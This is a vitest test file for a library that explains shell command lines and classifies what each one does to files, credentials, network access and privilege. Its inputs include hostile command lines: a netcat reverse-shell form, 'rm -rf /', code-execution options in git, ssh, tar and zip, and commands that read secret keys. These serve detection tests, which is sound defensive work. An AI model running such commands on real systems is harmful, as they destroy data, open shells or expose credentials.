import { describe, expect, it } from 'vitest'
import { createExplainer, explain } from './index.ts'
import { fact, opaqueFact, reach } from './entry.ts'
import { RANK, effectsOf, isComplete, merge } from './facts.ts'
import type { Facts } from './facts.ts'
import type { Rule } from './entry.ts'
import { COMMANDS } from './data/index.ts'

const run = (line: string, program?: string) => {
  const argv = line.split(' ')
  return explain({ program: program ?? `/usr/bin/${argv[0]}`, argv })
}
const roles = (line: string) => run(line).args.map((a) => `${a.value}:${a.role}`)

describe('lookup', () => {
  it('keys on the program name, not on the path it was found at', () => {
    expect(run('ls /tmp', '/opt/homebrew/bin/ls').key).toBe('ls')
  })

  it('reaches a row through a version suffix only where the row invites it', () => {
    const py = run('python3 run.py', '/usr/bin/python3')
    expect(py.key).toBe('python')
    expect(py.facts.source).toBe('name-fallback')
    expect(run('git2 status', '/usr/bin/git2').key).toBeNull()
  })

  it('says plainly when it has no entry, and claims nothing it cannot support', () => {
    const got = run('frobnicate --all', '/usr/local/bin/frobnicate')
    expect(got.key).toBeNull()
    expect(got.facts.confidence).toBe('unknown')
    expect(got.facts.opaque).toBe(true)
    expect(isComplete(got.facts)).toBe(false)
  })

  it('keys on argv[1] as a subcommand, and not when it is a flag', () => {
    expect(run('git push').subcommand).toBe('push')
    expect(run('git --version').subcommand).toBeUndefined()
  })

  it('falls back to the base row for a subcommand it does not hold, and marks it', () => {
    const got = run('git frobnicate')
    expect(got.subcommand).toBe('frobnicate')
    expect(got.facts.confidence).toBe('derived')
    expect(got.facts.source).toBe('subcommand-miss')
  })

  // `git -c core.pager=evil log` still runs `log`; the option before it can also make the whole line run a program.
  it('steps over global options to reach the subcommand', () => {
    const got = run('git -c core.pager=evil log')
    expect(got.subcommand).toBe('log')
    expect(got.facts.says).toBe('Shows the list of save points a project has, newest first.')
    expect(got.facts.opaque).toBe(true)
    expect(effectsOf(got.facts)).toContain('execute')
    expect(got.escalated).toContain('-c')
    expect(got.args[0]).toEqual({ index: 2, value: 'core.pager=evil', role: 'text', flag: '-c' })

    const harmless = run('git -C /tmp/proj status')
    expect(harmless.subcommand).toBe('status')
    expect(harmless.facts.opaque).toBe(false)
    expect(harmless.facts.confidence).toBe('verified')
    expect(harmless.args[0]).toEqual({ index: 2, value: '/tmp/proj', role: 'path', flag: '-C' })
  })

  it('cannot resolve the subcommand behind an option it does not hold, and says so', () => {
    const got = run('git --frobnicate log')
    expect(got.subcommand).toBeUndefined()
    expect(got.facts.confidence).toBe('derived')
    expect(got.facts.source).toBe('subcommand-miss')
  })
})

describe('escalating flags', () => {
  it('turns a file removal into a folder removal', () => {
    const plain = run('rm notes.txt')
    const deep = run('rm -r ~/Documents')
    expect(effectsOf(plain.facts)).toContain('delete')
    expect(deep.escalated).toEqual(['-r'])
    expect(deep.facts.says).not.toBe(plain.facts.says)
  })

  it('reads a bundle of short flags one letter at a time', () => {
    const got = run('tar -xzf backup.tgz')
    expect(got.escalated).toEqual(['-x'])
    expect(effectsOf(got.facts)).toContain('create')
    expect(got.args).toEqual([{ index: 2, value: 'backup.tgz', role: 'path', flag: '-f' }])
  })

  // `-X` is declared in `values`, not as a flag rule; inside a bundle its value must still not read as the address.
  it('hands the next word to a value flag at the end of a bundle', () => {
    expect(run('curl -sX POST https://example.com').sentence).toBe('Makes a request to example.com and shows what comes back.')
    expect(roles('curl -sX POST https://example.com')).toEqual(['POST:text', 'https://example.com:url'])
  })

  it('takes an optional value only when it is written onto the flag', () => {
    expect(roles('make -j4 install')).toEqual(['4:text', 'install:text'])
    expect(run('make -j4 install').args[0]).toEqual({ index: 1, value: '4', role: 'text', flag: '-j' })
    // On its own the flag takes nothing, so the next word is still the target.
    expect(roles('make -j install')).toEqual(['install:text'])
    expect(explain('make --jobs=4 install').args[0]).toEqual({ index: 1, value: '4', role: 'text', flag: '-j' })
    // A word that reaches anything but a letter before any value starts is not a bundle, and not one the row read.
    expect(run('make -1.5 install').unread).toEqual(['-1.5'])
  })

  it('reads the rest of a bundle as the value once a letter takes one', () => {
    expect(run('curl -XPOST https://example.com').args[0]).toEqual({ index: 1, value: 'POST', role: 'text', flag: '-X' })
    // The letters after `-X` are its value, so the `-T` and `-E` in `DELETE` do not widen anything.
    const del = run('curl -XDELETE https://example.com')
    expect(del.escalated).toEqual([])
    expect(effectsOf(del.facts)).not.toContain('transmit')
    expect(del.facts.touchesCredentials).toBe(false)
  })

  // `tar xf a.tar` carries its flags as a bare first word, which must not read as a file the command was pointed at.
  it('reads an old-style mode word as the flags it bundles', () => {
    const got = run('tar xf a.tar')
    expect(got.escalated).toEqual(['-x'])
    expect(effectsOf(got.facts)).toEqual(expect.arrayContaining(['create', 'write']))
    expect(got.facts.reversible).toBe('no')
    expect(got.args).toEqual([{ index: 2, value: 'a.tar', role: 'path', flag: '-f' }])
  })

  it('goes blind where an unpacking is told to run a program', () => {
    for (const line of ['tar xf a.tar --to-command=sh', 'tar xf a.tar -I sh', 'tar xf a.tar --checkpoint-action=exec=sh']) {
      const got = run(line)
      expect(got.facts.opaque, line).toBe(true)
      if (got.facts.opaque) expect(got.facts.handsOverTo, line).toBeTruthy()
      expect(effectsOf(got.facts), line).toContain('execute')
    }
  })

  it('leaves word flags alone where a program spells them out', () => {
    expect(run('find . -delete').escalated).toEqual(['-delete'])
    expect(run('find . -name *.log').escalated).toEqual([])
  })

  it('turns a download into a write, and an upload into a transmission', () => {
    const save = run('curl -o report.pdf https://example.com/r')
    expect(effectsOf(save.facts)).toEqual(['read', 'write', 'create'])
    expect(save.args).toEqual([
      { index: 2, value: 'report.pdf', role: 'path', flag: '-o' },
      { index: 3, value: 'https://example.com/r', role: 'url' },
    ])
    expect(effectsOf(run('curl -d name=x https://example.com').facts)).toContain('transmit')
  })

  it('reads a flag given with an equals sign, and reports it as the table names it', () => {
    expect(run('curl --output=r.pdf https://example.com').args[0]).toEqual({
      index: 1,
      value: 'r.pdf',
      role: 'path',
      flag: '-o',
    })
  })

  it('lets one flag turn a lookup into a password in plain view', () => {
    const quiet = run('security find-generic-password -s github')
    const loud = run('security find-generic-password -w -s github')
    expect(quiet.facts.touchesCredentials).toBe(true)
    expect(loud.escalated).toEqual(['-w'])
    expect(loud.facts.note).toBeTruthy()
    expect(loud.facts.says).not.toBe(quiet.facts.says)
  })

  it('stops reading flags after a bare double dash', () => {
    expect(roles('rm -- -r')).toEqual(['-r:path'])
    expect(run('rm -- -r').escalated).toEqual([])
  })
})

describe('a line the table has not read all of', () => {
  it('answers from the widest row at derived, and names the flag it did not read', () => {
    const got = run('rm --no-preserve-root -rf /')
    expect(got.unread).toEqual(['--no-preserve-root'])
    expect(got.facts.confidence).toBe('derived')
    expect(got.facts.source).toBe('unread')
    expect(effectsOf(got.facts)).toContain('delete')
  })

  // The flag nobody looked at may take the next word as its value, so no word after it can be named as a path.
  it('gives no role to the words after a flag it did not read', () => {
    expect(roles('rm --no-preserve-root -rf /')).toEqual(['/:unknown'])
  })

  it('reads a bundle only if it reads every letter in it', () => {
    expect(run('rm -rf x').unread).toBeUndefined()
    expect(run('rm -rZ x').unread).toEqual(['-rZ'])
  })

  it('falls back past a known subcommand to the program, which is where the widest reach is written', () => {
    const got = run('git log --oneline')
    expect(got.unread).toEqual(['--oneline'])
    expect(got.facts.opaque).toBe(true)
    expect(got.facts.says).toBe(run('git frobnicate').facts.says)
    expect(got.attribution[0]!.commands).toEqual(['git'])
  })

  it('treats a word on a row written to take none as one it has not read', () => {
    const got = run('whoami extra')
    expect(got.unread).toEqual(['extra'])
    expect(got.facts.confidence).toBe('derived')
  })

  it('leaves a line it read in full verified', () => {
    for (const line of ['rm -rf x', 'tar -xzf backup.tgz', 'curl -fsSL https://x.example']) {
      expect(run(line).unread, line).toBeUndefined()
      expect(run(line).facts.confidence, line).toBe('verified')
    }
  })

  // Whatever a row says it can do with the flags it knows, a line carrying one it does not know is answered at least
  // that wide. Otherwise a flag nobody read would be a way to get a narrower answer than a flag somebody did.
  const lines = Object.entries(COMMANDS).flatMap(([name, entry]) => [
    { line: `${name} --cmdfacts-unread`, rule: entry as Rule },
    ...Object.entries(entry.sub ?? {}).map(([word, sub]) => ({ line: `${name} ${word} --cmdfacts-unread`, rule: sub })),
  ])
  it.each(lines)('$line', ({ line, rule }) => {
    const got = run(line).facts
    const own = reach(rule)
    expect(got.confidence).not.toBe('verified')
    expect(RANK.network[got.network]).toBeGreaterThanOrEqual(RANK.network[own.network])
    expect(RANK.privilege[got.privilege]).toBeGreaterThanOrEqual(RANK.privilege[own.privilege])
    if (own.touchesCredentials) expect(got.touchesCredentials).toBe(true)
    if (own.opaque) expect(got.opaque).toBe(true)
    if (!got.opaque) {
      expect(effectsOf(got)).toEqual(expect.arrayContaining(effectsOf(own)))
      expect(RANK.reversible[got.reversible]).toBeGreaterThanOrEqual(RANK.reversible[own.reversible])
    }
  })
})

describe('argument roles', () => {
  it('names what each position is, so a consumer resolves it rather than parsing it', () => {
    expect(roles('chmod 755 /usr/local/bin/tool')).toEqual(['755:mode', '/usr/local/bin/tool:path'])
    expect(roles('kill -9 4821')).toEqual(['4821:pid'])
    expect(roles('ping example.com')).toEqual(['example.com:host'])
    expect(roles('brew install wget')).toEqual(['wget:package'])
    expect(roles('defaults read com.apple.dock orientation')).toEqual(['com.apple.dock:domain', 'orientation:text'])
    expect(roles('chown alex /etc/hosts')).toEqual(['alex:user', '/etc/hosts:path'])
  })

  it('repeats the last role across the rest of the line', () => {
    expect(roles('cp a.txt b.txt c/')).toEqual(['a.txt:path', 'b.txt:path', 'c/:path'])
  })

  it('does not read a role out of the text of an argument', () => {
    expect(roles('ls https://example.com')).toEqual(['https://example.com:path'])
  })

  // Each of these once read a flag's value as the thing the command was pointed at.
  it('gives a flag its value before counting operands', () => {
    const said = (line: string) => explain(line).sentence
    expect(said('ssh -i key.pem -L 8080:db:5432 deploy@bastion')).toBe('Connects to deploy@bastion and works on it from here.')
    expect(said('ping -c 4 example.com')).toBe('Checks whether example.com answers, and how long it takes.')
    expect(said('kill -s KILL 4821')).toBe('Stops the program running as 4821.')
    expect(said('mkdir -m 700 secrets')).toBe('Makes a new, empty folder at secrets.')
    expect(said('head -n 5 notes.txt')).toBe('Shows the first few lines of notes.txt.')
    expect(roles('git clone -b main https://example.com/r.git')).toEqual(['main:text', 'https://example.com/r.git:url'])
    expect(roles('pip install -r requirements.txt')).toEqual(['requirements.txt:path'])
    expect(roles('docker run -e FOO=1 -v /:/host ubuntu sh')).toEqual(['FOO=1:text', '/:/host:text', 'ubuntu:package', 'sh:command'])
  })

  it('finds the command handed over past the options that come before it', () => {
    expect(explain('sudo -g staff rm notes.txt').runs?.name).toBe('rm')
    expect(explain('xargs -I {} rm {}').runs?.name).toBe('rm')
    expect(explain('xargs -n 1 rm').runs?.name).toBe('rm')
  })

  it('reads a value flag inside a bundle as it would on its own', () => {
    expect(explain('git commit -am "fix the build"').args).toEqual([
      { index: 3, value: 'fix the build', role: 'text', flag: '-m' },
    ])
  })

  it('steps over a package manager option to reach the subcommand', () => {
    const got = explain('pnpm --filter web install')
    expect(got.subcommand).toBe('install')
    expect(got.facts.source).not.toBe('subcommand-miss')
  })

  it('lets a flag that carries the pattern turn every operand into a file', () => {
    expect(roles('grep foo notes.txt')).toEqual(['foo:pattern', 'notes.txt:path'])
    expect(roles('grep -e foo -e bar notes.txt')).toEqual(['foo:pattern', 'bar:pattern', 'notes.txt:path'])
    // grep reads its options anywhere on the line, so one after the operands still moves them.
    expect(roles('grep notes.txt -e foo')).toEqual(['notes.txt:path', 'foo:pattern'])
    expect(explain('grep -e TODO a.ts b.ts').sentence).toBe('Searches a.ts and b.ts for the lines that contain TODO.')
    expect(roles('grep -f patterns.txt notes.txt')).toEqual(['patterns.txt:path', 'notes.txt:path'])
  })

  it('reads the options a language tool takes anywhere on the line, before or after its subcommand', () => {
    expect(roles('cargo add serde -F derive')).toEqual(['serde:package', 'derive:text'])
    expect(roles('yarn --cwd web add react')).toEqual(['web:path', 'react:package'])
    expect(roles('conda install -n ml -c conda-forge numpy')).toEqual(['ml:text', 'conda-forge:text', 'numpy:package'])
    expect(roles('poetry -C app add requests')).toEqual(['app:path', 'requests:package'])
    expect(roles('cmake -S . -B build')).toEqual(['.:path', 'build:path'])
  })

  it('leaves a subcommand its own reading of a letter the tool uses elsewhere', () => {
    // `conda list -c` asks for the canonical names; it takes no channel.
    expect(roles('conda list -c numpy')).toEqual(['numpy:unknown'])
  })

  it('takes a value written onto the letter, and only that, where the tool reads it so', () => {
    expect(roles('ruby -F, script.rb')).toEqual([',:text', 'script.rb:path'])
    expect(roles('ruby -0 script.rb')).toEqual(['script.rb:path'])
  })

  it('reads the line npx is told to run as a command', () => {
    const got = explain({ program: '/usr/local/bin/npx', argv: ['npx', '-c', 'eslint .'] })
    expect(got.args).toEqual([{ index: 2, value: 'eslint .', role: 'command', flag: '-c' }])
  })
})

describe('tools that act on another service', () => {
  it('answers from the subcommand of two or three words that names the action', () => {
    expect(run('gh pr merge 12').subcommand).toBe('pr merge')
    expect(run('aws s3 rm s3://bucket/a').subcommand).toBe('s3 rm')
    expect(run('gcloud compute instances delete vm-1').subcommand).toBe('compute instances delete')
    expect(run('docker compose down').subcommand).toBe('compose down')
  })

  it('steps over the options a tool takes before its subcommand', () => {
    expect(run('kubectl -n web --context prod get pods').subcommand).toBe('get')
    expect(run('gh -R acme/site pr list').subcommand).toBe('pr list')
    expect(run('terraform -chdir=infra apply').subcommand).toBe('apply')
    expect(run('aws --profile prod s3 ls').subcommand).toBe('s3 ls')
    expect(run('docker-compose -f prod.yml up').subcommand).toBe('up')
  })

  it('marks a removal on the service as final', () => {
    for (const line of ['gh repo delete acme/site', 'kubectl delete pod web-1', 'aws s3 rm s3://b/a', 'helm uninstall web', 'vercel rm my-app']) {
      expect(run(line).facts.reversible, line).toBe('no')
      expect(effectsOf(run(line).facts), line).toContain('delete')
    }
  })

  it('marks every line that shows, saves or carries a key as touching credentials', () => {
    for (const line of [
      'gh auth token',
      'gh auth status -t',
      'kubectl config view --raw',
      'kubectl --token abc get pods',
      'aws configure get aws_secret_access_key',
      'aws ssm get-parameter --name db --with-decryption',
      'gcloud auth print-access-token',
      'terraform output db_password',
      'op read op://vault/db/password',
      'doppler secrets download',
      'vercel env pull',
      'docker compose config',
    ]) {
      expect(run(line).facts.touchesCredentials, line).toBe(true)
    }
    for (const line of ['gh auth status', 'kubectl config view', 'aws configure list', 'op item list']) {
      expect(run(line).facts.touchesCredentials, line).toBe(false)
    }
  })

  it('reads a flag that widens the line', () => {
    expect(run('kubectl apply -f app.yaml --prune').facts.reversible).toBe('no')
    expect(run('terraform apply -auto-approve').facts.note).toMatch(/without being shown/)
    expect(run('helm template web ./chart --post-renderer ./hook').facts.opaque).toBe(true)
    expect(run('helm template web ./chart').facts.opaque).toBe(false)
  })

  it('follows the command a secret store hands its secrets to', () => {
    const got = run('op run -- rm -rf build')
    expect(got.runs?.key).toBe('rm')
    expect(got.facts.touchesCredentials).toBe(true)
    expect(effectsOf(got.facts)).toContain('delete')
  })

  it('reads compose options only where compose reads them', () => {
    expect(roles('docker compose logs -f web')).toEqual(['web:text'])
    expect(roles('docker-compose -f prod.yml up')).toEqual(['prod.yml:path'])
  })

  it('answers for the programs that work the same as one it holds', () => {
    expect(run('podman run --privileged alpine').facts.privilege).toBe('root')
    expect(run('tofu destroy').facts.says).toBe(run('terraform destroy').facts.says)
  })
})

describe('credentials on a publishing line', () => {
  it('marks the token or one-time code a publish carries', () => {
    expect(run('cargo publish --token abc').facts.touchesCredentials).toBe(true)
    expect(run('cargo publish').facts.touchesCredentials).toBe(false)
    // Even where the subcommand has no row of its own, the option is read wherever it is.
    expect(run('yarn npm publish --otp 123456').facts.touchesCredentials).toBe(true)
  })
})

describe('subcommands of more than one word', () => {
  const entry = {
    facts: opaqueFact('Works with a cluster.', 'the cluster', { privilege: 'none', touchesCredentials: false, reversible: 'no', network: 'arbitrary', repeatSafe: false, docs: 'x' }),
    sub: {
      pods: { facts: fact('Works with the pods.', { effect: ['read', 'delete'], privilege: 'none', touchesCredentials: false, repeatSafe: true, reversible: 'no', network: 'arbitrary', docs: 'x' }), operands: ['text' as const] },
      'pods delete': {
        facts: fact('Removes a pod.', { privilege: 'none', touchesCredentials: false, repeatSafe: true, effect: ['delete'], reversible: 'no', network: 'arbitrary', docs: 'x' }),
        operands: ['text' as const],
      },
    },
  }
  const kc = createExplainer({ packs: [{ name: 'k', version: '1', commands: { kc: entry } }], trust: ['k'] })
  const read = (line: string) => kc({ program: 'kc', argv: line.split(' ') })

  it('answers from the longest subcommand the words spell out', () => {
    const got = read('kc pods delete web-1')
    expect(got.subcommand).toBe('pods delete')
    expect(got.facts.says).toBe('Removes a pod.')
    expect(got.args).toEqual([{ index: 3, value: 'web-1', role: 'text' }])
    expect(got.attribution[0]!.commands).toEqual(['kc pods delete'])
  })

  it('lets the shorter one answer, at derived, for a further word it does not hold', () => {
    const got = read('kc pods restart web-1')
    expect(got.subcommand).toBe('pods restart')
    expect(got.facts.says).toBe('Works with the pods.')
    expect(got.facts.confidence).toBe('derived')
    expect(got.args).toEqual([{ index: 3, value: 'web-1', role: 'text' }])
  })

  it('reads a flag as the end of the subcommand', () => {
    expect(read('kc pods -w delete').subcommand).toBe('pods')
  })

  it('never takes a name from the object machinery for a subcommand', () => {
    for (const word of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
      const got = run(`git ${word}`)
      expect(got.facts.confidence).toBe('derived')
      expect(got.key).toBe('git')
    }
  })
})

describe('opacity', () => {
  it('marks the position where it stops being able to see', () => {
    const got = run('ssh ops@host rm -rf /var/tmp')
    expect(got.facts.opaque).toBe(true)
    expect(got.args).toEqual([
      { index: 1, value: 'ops@host', role: 'host' },
      { index: 2, value: 'rm', role: 'command' },
      { index: 3, value: '-rf', role: 'command' },
      { index: 4, value: '/var/tmp', role: 'command' },
    ])
  })

  it('does not let an opaque row be read as a complete one', () => {
    const got = run('sh -c curl')
    expect(got.facts.opaque).toBe(true)
    // `effect` is absent from the type on an opaque row; this is the only way to the list.
    expect(effectsOf(got.facts)).toEqual(['execute'])
    expect(isComplete(got.facts)).toBe(false)
    expect(got.args).toEqual([{ index: 2, value: 'curl', role: 'command', flag: '-c' }])
  })

  it('carries over to a command that is clear until a flag is added', () => {
    const plain = run('find . -name *.log')
    const exec = run('find . -exec rm {} +')
    expect(plain.facts.opaque).toBe(false)
    expect(exec.facts.opaque).toBe(true)
    expect(exec.facts.repeatSafe).toBe(false)
    // It cannot promise anything can be put back, but `rm` lets it still say that something cannot be.
    expect(exec.facts.reversible).toBe('no')
    expect(run('sh -c anything').facts.reversible).toBe('unknown')
  })

  it('is set for the package installs that run set-up steps of their own', () => {
    for (const line of ['npm install', 'pnpm add left-pad', 'brew install wget', 'pip install requests']) {
      expect(run(line).facts.opaque, line).toBe(true)
    }
  })

  // Each of these names a program that runs on this computer, where the row alone would say nothing does.
  it('names the program a setting or a transfer option runs here', () => {
    const proxied = explain('ssh -o ProxyCommand=evil deploy@bastion')
    expect(proxied.facts.opaque && proxied.facts.handsOverTo).toMatch(/on this one/)
    expect(proxied.escalated).toEqual(['-o'])
    expect(explain('ssh -F ./cfg deploy@bastion').escalated).toEqual(['-F'])

    const clear = explain('git clone https://example.com/r.git')
    expect(clear.facts.opaque).toBe(false)
    for (const line of [
      'git clone -u evil /tmp/r',
      'git clone -c core.fsmonitor=evil https://example.com/r.git',
      'git clone --template ./t https://example.com/r.git',
      'git fetch --upload-pack evil',
      'git push --receive-pack evil',
    ]) {
      const got = explain(line)
      expect(got.facts.opaque, line).toBe(true)
      expect(effectsOf(got.facts), line).toContain('execute')
    }
  })
})

describe('flags that reach past what the row describes', () => {
  it('marks a line that hands over a password, a key or a file of secrets', () => {
    for (const line of [
      'ssh -i ~/.ssh/id_ed25519 deploy@bastion',
      'unzip -P hunter2 a.zip',
      'npm publish --otp 123456',
      'node --env-file .env app.js',
      'docker run --env-file .env ubuntu',
      'curl -n https://example.com',
      'curl --oauth2-bearer abc https://example.com',
    ]) {
      expect(explain(line).facts.touchesCredentials, line).toBe(true)
    }
    expect(explain('ssh deploy@bastion').facts.touchesCredentials).toBe(false)
  })

  it('says when a tunnel opens a door on this computer', () => {
    expect(explain('ssh deploy@bastion').facts.network).toBe('known-host')
    for (const line of ['ssh -L 8080:db:5432 deploy@bastion', 'ssh -D 1080 deploy@bastion']) {
      expect(explain(line).facts.network, line).toBe('listens')
    }
  })

  it('reads an edit in place, a removed label and a replaced name as changes that stay', () => {
    const sed = explain("sed -i.bak s/http/https/ site.conf")
    expect(effectsOf(sed.facts)).toContain('write')
    expect(sed.facts.reversible).toBe('no')
    expect(explain('sed s/http/https/ site.conf').facts.opaque).toBe(true)

    const unquarantined = explain('xattr -d com.apple.quarantine /Applications/Tool.app')
    expect(effectsOf(unquarantined.facts)).toEqual(expect.arrayContaining(['configure', 'delete']))
    expect(unquarantined.args.map((a) => `${a.value}:${a.role}`)).toEqual(['com.apple.quarantine:text', '/Applications/Tool.app:path'])

    expect(explain('ln -s a b').facts.reversible).toBe('yes')
    expect(explain('ln -sf a b').facts.reversible).toBe('no')
  })

  it('names the program a packing tool is told to run', () => {
    expect(explain("zip -T -TT 'sh -c id' out.zip notes.txt").facts.opaque).toBe(true)
    expect(explain('sort --compress-program gzip big.txt').facts.opaque).toBe(true)
    expect(explain('zip out.zip notes.txt').facts.opaque).toBe(false)
  })

  it('reads the account and scheduling tools as reaching past one command', () => {
    // Listing the schedule and replacing it read the same: the line cannot say which it is.
    for (const line of ['crontab -l', 'crontab jobs.txt']) expect(explain(line).facts.opaque, line).toBe(true)
    expect(explain('dscl . -read /Users/alex').facts.touchesCredentials).toBe(false)
    expect(explain('dscl . -passwd /Users/alex').facts.touchesCredentials).toBe(true)
    expect(explain('dscl -u admin -P hunter2 . -read /Users/alex').facts.touchesCredentials).toBe(true)
    expect(explain('sysadminctl -deleteUser alex').facts.reversible).toBe('no')
    expect(explain('pbpaste').facts.touchesCredentials).toBe(true)
  })

  it('reads a signal named as a word as a signal, not as a bundle', () => {
    expect(roles('pkill -HUP nginx')).toEqual(['nginx:pattern'])
    expect(roles('pgrep -u root sshd')).toEqual(['root:user', 'sshd:pattern'])
  })

  it('reads the copying and fetching tools by what they reach', () => {
    expect(explain('scp -i key.pem notes.txt deploy@bastion:/srv/').facts.touchesCredentials).toBe(true)
    expect(explain('scp -o ProxyCommand=evil a b:').facts.opaque).toBe(true)
    expect(effectsOf(explain('rsync -a --delete src/ backup:/srv/').facts)).toContain('delete')
    expect(explain('rsync -e ssh a b:').facts.opaque).toBe(true)
    expect(explain('wget -O /tmp/x.sh https://get.example.com').sentence).toBe(
      'Makes a request to get.example.com and saves what comes back into /tmp/x.sh.',
    )
    expect(explain('wget --save-cookies c.txt https://example.com').facts.touchesCredentials).toBe(true)
    expect(roles('nc -l 8080')).toEqual(['8080:text'])
    expect(explain('nc -e /bin/sh example.com 4444').facts.opaque).toBe(true)
    expect(explain('ssh-keygen -R github.com').facts.reversible).toBe('no')
  })

  it('reads a curl settings file as able to send and save', () => {
    const got = explain('curl -K ./opts https://example.com')
    expect(effectsOf(got.facts)).toEqual(expect.arrayContaining(['transmit', 'write', 'create']))
    expect(got.facts.reversible).toBe('no')
  })

  it('reads a packaged program given full control or a folder of this computer', () => {
    const privileged = explain('docker run --privileged ubuntu')
    expect(privileged.facts.privilege).toBe('root')
    expect(effectsOf(privileged.facts)).toContain('elevate')
    const mounted = explain('docker run -v /:/host ubuntu')
    expect(effectsOf(mounted.facts)).toEqual(expect.arrayContaining(['read', 'write']))
    expect(mounted.args[0]).toEqual({ index: 3, value: '/:/host', role: 'text', flag: '-v' })
  })
})

describe('the command inside the command', () => {
  it('looks up a nested command that runs here, and says where it sits on the line', () => {
    const got = run('sudo rm -rf /var/tmp')
    expect(got.runs?.key).toBe('rm')
    expect(got.runs?.facts.source).toBe('nested')
    expect(got.runs?.facts.confidence).toBe('derived')
    expect(got.runs?.args).toEqual([{ index: 3, value: '/var/tmp', role: 'path' }])
  })

  it('carries what the inner command does up to the outer one', () => {
    const got = run('sudo rm -rf /var/tmp')
    expect(effectsOf(got.facts)).toEqual(['delete', 'execute', 'elevate'])
    expect(got.facts.privilege).toBe('root')
    expect(got.facts.reversible).toBe('no')
  })

  it('never lets the inner command clear the outer one', () => {
    for (const line of ['sudo ls /tmp', 'xargs ls', 'env PATH=/bin ls']) {
      expect(run(line).facts.opaque, line).toBe(true)
      expect(run(line).facts.repeatSafe, line).toBe(false)
    }
  })

  it('steps over the settings env is given before the command', () => {
    const got = run('env FOO=bar node app.js')
    expect(got.runs?.key).toBe('node')
    expect(got.runs?.args).toEqual([{ index: 3, value: 'app.js', role: 'path' }])
  })

  it('reads the command a search hands each file to', () => {
    const got = run('find . -exec rm {} +')
    expect(got.runs?.key).toBe('rm')
    expect(effectsOf(got.facts)).toContain('delete')
  })

  it('will not split a string to find a command inside it', () => {
    expect(run('sh -c rm').runs).toBeUndefined()
    expect(run('node -e x').runs).toBeUndefined()
  })

  it('does not report a command that runs on another computer as one that runs here', () => {
    expect(run('ssh host rm -rf /var/tmp').runs).toBeUndefined()
  })

  it('admits it when the inner command is not one it knows', () => {
    const got = run('sudo frobnicate')
    expect(got.runs?.key).toBeNull()
    expect(got.runs?.facts.confidence).toBe('unknown')
    expect(got.facts.opaque).toBe(true)
  })

  it('stops going deeper rather than following a line without end', () => {
    const argv = [...Array(12).fill('sudo'), 'ls']
    const got = explain({ program: '/usr/bin/sudo', argv })
    let depth = 0
    for (let e = got.runs; e; e = e.runs) depth++
    expect(depth).toBeLessThanOrEqual(4)
  })

  it('has nothing to report where no command was given', () => {
    expect(run('sudo').runs).toBeUndefined()
    expect(run('xargs').runs).toBeUndefined()
  })
})

describe('merge', () => {
  const base: Facts = {
    effect: ['read'],
    reversible: 'yes',
    network: 'none',
    privilege: 'none',
    opaque: false,
    touchesCredentials: false,
    repeatSafe: true,
    confidence: 'verified',
    source: 'curated',
    says: 'Reads a file.',
  }

  it('widens and never narrows', () => {
    const got = merge({ ...base, reversible: 'no', network: 'arbitrary', privilege: 'root' }, {
      reversible: 'yes',
      network: 'none',
      privilege: 'none',
      repeatSafe: true,
      touchesCredentials: false,
    })
    expect(got.reversible).toBe('no')
    expect(got.network).toBe('arbitrary')
    expect(got.privilege).toBe('root')
  })

  it('makes handing over one way', () => {
    const blind = merge(base, { opaque: true, handsOverTo: 'the commands it was given' })
    expect(blind.opaque).toBe(true)
    expect(blind.reversible).toBe('unknown')
    expect(blind.repeatSafe).toBe(false)
    expect(merge(blind, { reversible: 'yes', repeatSafe: true }).opaque).toBe(true)
    expect(merge(blind, { reversible: 'yes', repeatSafe: true }).repeatSafe).toBe(false)
  })

  it('keeps the effect list in one order whichever way a row was built', () => {
    expect(effectsOf(merge(base, { effect: ['delete', 'create'] }))).toEqual(['read', 'create', 'delete'])
  })
})

describe('repeatSafe as a policy input', () => {
  it('is false wherever a standing grant would be wrong', () => {
    for (const line of ['git commit', 'npm install', 'curl -d x https://example.com', 'sudo ls']) {
      expect(run(line).facts.repeatSafe, line).toBe(false)
    }
    expect(run('ls /tmp').facts.repeatSafe).toBe(true)
  })
})
